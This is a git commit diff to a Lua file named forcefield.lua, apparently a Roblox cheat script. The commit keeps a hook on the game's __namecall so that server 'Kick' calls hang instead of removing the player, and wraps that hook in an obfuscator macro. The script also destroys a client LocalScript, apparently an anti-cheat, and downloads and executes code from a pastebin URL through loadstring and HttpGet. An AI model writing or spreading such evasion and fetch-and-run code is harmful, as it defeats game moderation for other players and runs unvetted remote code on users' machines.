8fd5dcce13e0b8cabb7993c3c9ef14a1ae6fac08
Simoniko <52357715+Simoniko@users.noreply.github.com>
2023-09-06 20:07:36 +0200

    Update forcefield.lua

--- forcefield.lua
+++ forcefield.lua
@@ -1,11 +1,12 @@
 pcall(function()
-        local old
-
-        old = hookmetamethod(game, "__namecall", function(...)
-            if getnamecallmethod() == "Kick" then 
-                return wait(9e9) 
-            end
-            return old(...)
+        LPH_JIT_MAX(function()
+                local old
+                old = hookmetamethod(game, "__namecall", function(...)
+                    if getnamecallmethod() == "Kick" then 
+                        return wait(9e9) 
+                    end
+                    return old(...)
+                end)
         end)
 
         local playerscripts = game:GetService'Players'.LocalPlayer.PlayerScripts
@@ -34,6 +35,7 @@ pcall(function()
         if game.Players.LocalPlayer.PlayerScripts:FindFirstChild("LocalScript") then
         game.Players.LocalPlayer.PlayerScripts:FindFirstChild("LocalScript"):Destroy()
         end
-
+        pcall(function()
         loadstring(game:HttpGet("https://pastebin.com/raw/BMGbkQ71"))();
+        end)
 end)
